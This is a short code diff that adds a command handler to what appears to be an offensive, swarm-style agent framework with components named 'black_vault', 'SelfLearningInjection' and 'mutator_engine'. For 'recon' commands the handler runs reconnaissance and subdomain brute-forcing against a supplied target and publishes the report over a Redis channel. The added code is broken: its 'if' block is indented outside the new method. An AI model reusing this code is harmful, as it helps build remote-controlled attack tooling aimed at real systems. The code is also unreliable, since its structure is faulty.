@@ -121,6 +121,18 @@ self.self_learning_injection = SelfLearningInjection(self.black_vault)
             self.mutator_engine.evolve_composition()
         except Exception as e:
             self.logger.error(f"Reflection failed: {e}")
+    def execute_command(self, command):
+        command_id = command.get("command_id",          get_random_bytes(16).hex())
+    if command.get("type") == "recon":
+        target = command.get("target")
+        max_depth = command.get("max_depth", 3)
+        brute_subdomains = command.get("brute_subdomains", True)
+        result = self.recon_module.advanced_recon(target, max_depth, None, brute_subdomains, command_id)
+        self.swarm.redis.publish(self.swarm.channel, json.dumps({
+            "command_id": command_id,
+            "type": "recon_report",
+            "data": result
+        }))
 
     def shutdown(self):
         self.logger.info("Shutting down agents and systems")
